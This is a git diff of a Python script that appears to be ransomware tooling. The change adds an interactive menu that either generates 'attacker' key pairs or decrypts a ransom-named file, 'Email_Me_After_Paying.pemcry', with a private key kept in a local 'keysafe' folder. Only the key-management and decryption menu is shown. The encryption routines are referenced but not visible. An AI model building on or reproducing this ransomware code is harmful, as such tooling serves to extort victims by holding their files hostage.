@@ -117,7 +117,22 @@ def decrypt_blob(encryptedblob, private_key_path):
 
 
 if __name__ == '__main__':
-    # genattackerkeys()
-    # print(encrypt_file("./f1.txt", "../keysafe/public.pem"))
-    dest_path = os.path.expanduser('~') + "/Documents/keysafe"
-    print(decrypt_file("./Email_Me_After_Paying.pemcry", dest_path + "/private.pem"))
+    while True:
+        try:
+            print("Select the options: \n 1. To Generate Key Pair. \n 2. Decrypt a file using Private Key.")
+            option = int(input("Enter choice: "))
+            if option == 1:
+                print("Genning Keys");
+                genattackerkeys()
+                break
+            elif option == 2:
+                print("Decrypting");
+                dest_path = os.path.expanduser('~') + "/Documents/keysafe"
+                decrypt_file("./Email_Me_After_Paying.pemcry", dest_path + "/private.pem")
+                break
+            else:
+                print("Invalid Entry. Choose from below options only. \n\n");
+        except Exception as e:
+            print("Invalid Entry. Choose from below options only. \n\n");
+            pass
+
